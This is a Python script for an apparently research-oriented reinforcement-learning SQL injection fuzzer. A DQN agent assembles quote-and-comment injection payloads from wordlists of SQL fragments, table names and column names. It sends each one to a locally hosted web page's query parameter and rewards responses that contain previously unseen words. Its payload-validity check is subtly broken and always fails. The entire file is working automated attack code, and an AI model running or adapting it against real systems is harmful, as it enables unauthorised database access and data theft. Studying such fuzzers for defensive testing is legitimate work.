import os
from typing import List

from dqn import DQN
from enums.special_action import SpecialAction
from models.epsilon_model import EpsilonModel
from models.rl_hyperparameters_model import RLHyperparametersModel
import numpy as np
import requests
import re

from sqltree import sqltree;

url = 'http://localhost.proxyman.io:3000/rest/user/login'

# Scrape site solution by T0ny lombardi from:
# https://stackoverflow.com/questions/9265172/scrape-an-entire-website
# os.system('wget -m -k -K -E -l 7 -t 6 -w 5 http://localhost:3000 -P ./scraped')

feature_count = 150

visible_chars = [chr(i) for i in range(32, 127)]
numbers = [str(i) for i in range(0, 10)]

with open('parsed-scrape.txt', 'r') as f:
    data = f.read()
f.close()

scraped_words = list(filter(lambda s: s != '', data.split(' ')))
found_words = []
found_words_reward = []

with open('sql_list.txt', 'r') as f:
    data = f.read()
f.close()

sql_list = data.split('\n')

with open('tables.txt', 'r') as f:
    data = f.read()
f.close()

tables = list(map(lambda table: table + ' ', data.split('\n')))

with open('columns.txt', 'r') as f:
    data = f.read()
f.close()

columns = list(map(lambda column: column + ' ', data.split('\n')))

# with open('SQLiV3.csv', 'r') as f:
#   data = f.read()
# f.close()
#
# sql_injection_list = data.split('\n')

tables_and_columns = tables + columns

mutation_actions = sql_list + numbers + tables_and_columns

# Half of action space terminates to prefer smaller queries, which implies
# more payloads executed.
terminating_actions = [SpecialAction.TERMINATE for _ in range(len(mutation_actions))]

# For selecting indicies in a non-terminating state to replace characters
# with.
# replacement_indicies: List[int] = []
#replacement_actions = [SpecialAction.REPLACE for _ in range(feature_count)]
# replacement_actions = []

actions = terminating_actions + mutation_actions

injected_payloads = []

terminated = False
state: np.ndarray

'''
def __post_login_error():
    res = requests.post(url, data={
        'email': 'test'
    })

    unique_tokens = set()
    for token in re.split('[^a-zA-Z]+', res.text):
        unique_tokens.add(token) 
    scraped_words.append(unique_tokens)

# Ensure normal login error is not rewarded.
__post_login_error()
'''

def __get_payload(state: np.ndarray):
    chrs = state.tolist()
    chrs = [chr(int(i)) for i in chrs if i != 0.0]
    return '\' ' + ''.join(chrs) + '#'

# def __get_inverse_mutation_mask(with_replacements: bool = True):
#    return range(len(replacement_actions), len(actions)) \
#        if with_replacements else range(len(actions))

def __set_mutation_mask(with_replacements: bool = True):
    dqn.available_actions_range = range(len(actions)) #__get_inverse_mutation_mask(with_replacements)

def __perform_termination_action():
    global state

    # Update the mask to account for potentially appended actions
    # and to prevent immediate termination action of an empty state.
    __toggle_termination_mask(True)

    payload = __get_payload(state)
    injected_payloads.append(payload)

    if(__is_valid_sql_payload(payload)):
        state = dqn.create_empty_state()
        return state, -1, True

    print(payload)
    res = requests.get(f'http://127.0.0.1:5000/pages?prodLine={payload}')
    #res = requests.post(url, data={
    #    'email': payload
    #})

    unique_tokens = set()
    for token in re.split('[^a-zA-Z]+', res.text):
        unique_tokens.add(token)

    reward = 0

    new_tokens = []
    for token in unique_tokens:
        if(token not in scraped_words):
            if(token not in found_words):
                found_words.append(token)
                new_tokens.append(token)
                reward += 1
            '''
            found = False

            for i in range(len(found_words)):
                if(found_words[i] == token):
                    reward += found_words_reward[i]
                    found_words_reward[i] *= 0.9
                    found = True
                    break
                
            if(not found):
                found_words.append(token)
                found_words_reward.append(0.9)
                new_tokens.append(token)
                reward += 1
            
            successful_payloads.append(payload)
            '''


    if(len(new_tokens) > 0):
        print(payload)
        print('\nNEW DATA')
        print('\nFound:', new_tokens, '\n')

    state = dqn.create_empty_state()

    return state, reward, True

'''
def __get_filled_state_length():
    filled_state_length = 0

    for encoded_char in state:
        if(encoded_char == 0.0):
            break
        filled_state_length += 1

    return filled_state_length

def __set_replacement_mask(filled_state_length: int):
    dqn.available_actions_range = range(filled_state_length)
'''

def __toggle_termination_mask(set_mask: bool):
    if(set_mask):
        dqn.available_actions_range = range(len(terminating_actions), len(actions))
    else:
        __set_mutation_mask()

'''
def __perform_replacement_action(action_index: int):
    global state, replacement_indicies

    indicies_length = len(replacement_indicies)

    if(indicies_length >= 2):
        raise Exception('Only 2 replacement indicies can at most be defined.')
    
    # Negatively reward a replacement action when no payload string has
    # yet been defined. Must return early as otherwise the action mask will
    # cover all actions.
    filled_state_length = __get_filled_state_length()
    if(filled_state_length == 0):
        return state, -1, False
    
    replacement_indicies.append(action_index)

    if(indicies_length == 1):
        __set_replacement_mask(filled_state_length)
    else:
        __set_mutation_mask(with_replacements=False)

    return state, 0, False

def __has_replacement_indicies():
    return len(replacement_indicies) == 2

def __reset_replacement_indicies():
    global replacement_indicies

    replacement_indicies = []
'''

def __is_valid_sql_payload(state: np.ndarray):
    try:
        payload = __get_payload(state)
        sqltree(f'SELECT * FROM test WHERE test = \'{payload}\'')
        return True
    except:
        return False

def __perform_mutation_action(action: str):
    global state

    '''
    if(__has_replacement_indicies()):
        start = replacement_indicies[0]
        exclusive_end = replacement_indicies[1] + 1
        
        leading_string = state[:start]
        tailing_string = state[exclusive_end:-1]

        new_state = leading_string + [ord(action[i]) for i in len(action)] + tailing_string

        __reset_replacement_indicies()
        __set_mutation_mask(with_replacements=True)

        if(__is_valid_sql_payload(new_state)):
            state = new_state
            return state, 0, False
        
        return state, -1, False
    '''
    
    # Append character(s) to the state if the state is not
    # completely filled (0.0 represents an empty character slot).
    for i in range(len(state)):
        if(state[i] != 0.0):
            continue

        for j in range(len(action)):
            state_index = i + j
            if(state_index >= len(state)):
                break

            state[state_index] = ord(action[j])
        
        break

    payload = __get_payload(state)
    injected = payload in injected_payloads
    __toggle_termination_mask(injected)
    
    return state, -1, False

def __perform_action(action_index: int):
    global actions

    action = actions[action_index]

    if(action == SpecialAction.TERMINATE):
        return __perform_termination_action()
    '''
    elif(action == SpecialAction.REPLACE):
        return __perform_replacement_action(action_index)
    '''
    
    return __perform_mutation_action(action)

dqn = DQN(
    RLHyperparametersModel(
        gamma=0.9,
        learning_rate=0.00025,
        batch_size=64,
        training_episodes=100000,
        test_episodes=100,
        max_steps_per_episode=100,
        feature_count=feature_count,
        action_count=len(actions)
    ),
    EpsilonModel(
        start=1.0,
        min=0.1,
        max=1.0,
        random_frame_count=10000,
        greedy_frame_count=1000000
    ),
    available_actions_range=range(len(actions)), #__get_inverse_mutation_mask(),
    perform_action_callback=__perform_action
)

state = dqn.create_empty_state()

model, model_target = dqn.create_model()
dqn.run(model, model_target)